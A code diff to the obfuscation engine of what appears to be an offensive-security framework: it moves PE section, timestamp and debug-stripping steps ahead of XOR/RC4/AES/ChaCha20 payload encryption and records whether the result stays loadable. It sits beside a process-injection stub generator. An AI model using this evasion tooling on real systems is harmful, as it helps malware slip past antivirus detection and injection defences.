@@ -1296,6 +1296,10 @@ class ObfuscationEngine:
         self._output_dir = Path(config.get("paths.obfuscated_artifacts", "./payloads/obfuscated"))
         self._output_dir.mkdir(parents=True, exist_ok=True)
         self._logger = logging.getLogger("pupyteer.obfuscation_engine")
+        #: What the last pass produced, including whether it is still loadable.
+        #: Empty until a pass runs. Callers surface this; a scrambled sample
+        #: must not be reported as a payload.
+        self.last_output: Dict[str, Any] = {}
     
     async def initialize(self):
         """Initialize the engine."""
@@ -1317,7 +1321,20 @@ class ObfuscationEngine:
         return await loop.run_in_executor(None, self._obfuscate_sync, input_path, config)
     
     def _obfuscate_sync(self, input_path: str, config: ObfuscationConfig) -> str:
-        """Synchronous obfuscation pipeline."""
+        """Synchronous obfuscation pipeline.
+
+        Order matters and used not to hold: PE hardening ran *after* the
+        encoding step, so on any profile that asked for both — five of the eight
+        built-ins — it was renaming sections and rewriting timestamps on
+        ciphertext, then reporting success. The file was unchanged in every way
+        that mattered. Hardening now runs on the real image first.
+
+        The result also records whether the artifact is still loadable. A
+        whole-file encoding scheme replaces the file with ciphertext, which is a
+        legitimate sample to hand a scanner and is not a payload anyone can
+        deploy; calling that out is the difference between an evasion result an
+        operator can act on and one that quietly lies.
+        """
         self._logger.info("Obfuscating: %s", input_path)
 
         input_path = Path(input_path)
@@ -1329,30 +1346,48 @@ class ObfuscationEngine:
         import shutil
         shutil.copy2(input_path, output_path)
 
-        # Read input
         with open(output_path, "rb") as f:
             data = f.read()
+        input_was_pe = data[:2] == b"MZ"
 
-        # Apply encryption scheme. AEAD schemes (GCM/ChaCha20) are preferred;
-        # XOR/RC4 remain only for back-compat with existing profiles.
+        # 1. PE hardening, on the real image. Best-effort and bounds-checked;
+        #    skipped entirely for a non-PE, where there is no header to harden.
+        if input_was_pe:
+            if config.randomize_pe_sections:
+                pe_randomize_sections(str(output_path), str(output_path))
+            if config.modify_pe_timestamp:
+                pe_modify_timestamp(str(output_path), str(output_path))
+            if config.strip_pe_debug:
+                pe_strip_debug(str(output_path), str(output_path))
+            with open(output_path, "rb") as f:
+                data = f.read()
+
+        # 2. Encoding scheme. AEAD schemes (GCM/ChaCha20) are preferred;
+        #    XOR/RC4 remain only for back-compat with existing profiles.
+        encrypted = False
         with warnings.catch_warnings():
             warnings.simplefilter("ignore", DeprecationWarning)
             if config.scheme == EncodingScheme.XOR:
                 key = secrets.token_bytes(config.xor_key_size)
                 data = xor_crypt(data, key)
+                encrypted = True
             elif config.scheme == EncodingScheme.RC4:
                 key = secrets.token_bytes(config.rc4_key_size)
                 data = rc4_crypt(data, key)
+                encrypted = True
             elif config.scheme == EncodingScheme.AES:
                 key = secrets.token_bytes(config.aes_key_size)
                 iv = secrets.token_bytes(16)
                 data = aes_256_cbc_encrypt(data, key, iv)
+                encrypted = True
             elif config.scheme == EncodingScheme.AES_GCM:
                 key = secrets.token_bytes(AEAD_KEY_SIZE)
                 data = aes_256_gcm_encrypt(data, key)
+                encrypted = True
             elif config.scheme == EncodingScheme.CHACHA20:
                 key = secrets.token_bytes(AEAD_KEY_SIZE)
                 data = chacha20poly1305_encrypt(data, key)
+                encrypted = True
             elif config.scheme == EncodingScheme.CHAIN:
                 key1 = secrets.token_bytes(config.xor_key_size)
                 key2 = secrets.token_bytes(config.rc4_key_size)
@@ -1361,21 +1396,32 @@ class ObfuscationEngine:
                 data = xor_crypt(data, key1)
                 data = rc4_crypt(data, key2)
                 data = aes_256_cbc_encrypt(data, key3, iv)
+                encrypted = True
 
-        # Write the (possibly encrypted) buffer back before PE work
-        _write_pe(str(output_path), data)
+        if encrypted:
+            _write_pe(str(output_path), data)
 
-        # PE manipulation — each step is best-effort and bounds-checked
-        if config.randomize_pe_sections:
-            pe_randomize_sections(str(output_path), str(output_path))
-        if config.modify_pe_timestamp:
-            pe_modify_timestamp(str(output_path), str(output_path))
-        if config.strip_pe_debug:
-            pe_strip_debug(str(output_path), str(output_path))
+        # Loadable means: whatever consumed the input can still consume this.
+        # A PE that no longer starts with MZ is not a PE, and a script that was
+        # replaced by ciphertext is not a script.
+        loadable = (data[:2] == b"MZ") if input_was_pe else not encrypted
+        self.last_output = {
+            "path": str(output_path),
+            "input_was_pe": input_was_pe,
+            "scheme": config.scheme.value,
+            "encrypted": encrypted,
+            "loadable": loadable,
+        }
+        if not loadable:
+            self._logger.warning(
+                "%s is not a loadable payload any more: scheme '%s' replaced "
+                "the file with ciphertext. It is a sample for a scanner, not "
+                "something to deploy.",
+                output_path, config.scheme.value)
 
         self._logger.info("Obfuscation complete: %s", output_path)
         return str(output_path)
-    
+
     def generate_injection_payload(self, target: str, shellcode: bytes, method: str = "createremotethread") -> str:
         """Generate a process injection stub as Python code."""
         return generate_injection_stub(target, shellcode, method)
